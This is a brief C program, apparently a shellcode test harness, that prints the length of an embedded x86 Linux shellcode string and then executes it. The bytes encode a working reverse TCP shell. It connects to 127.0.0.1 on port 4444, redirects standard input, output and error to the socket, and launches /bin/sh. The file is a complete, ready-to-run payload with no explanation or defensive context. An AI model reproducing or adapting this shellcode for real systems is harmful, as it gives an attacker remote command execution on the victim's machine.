#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x66\xb8\x67\x01\x31\xdb\xb3\x02\x31\xc9\xb1\x01\x31\xd2\xcd\x80\x89\xc7\x89\xfb\x31\xd2\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x39\xd1\x75\xf5\x31\xd2\x68\x7f\xbb\xbb\x01\x66\x89\x54\x24\x01\x66\x68\x11\x5c\x66\x6a\x02\x89\xe1\x31\xdb\x89\xfb\x31\xc0\x66\xb8\x6a\x01\x31\xd2\xb2\x10\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
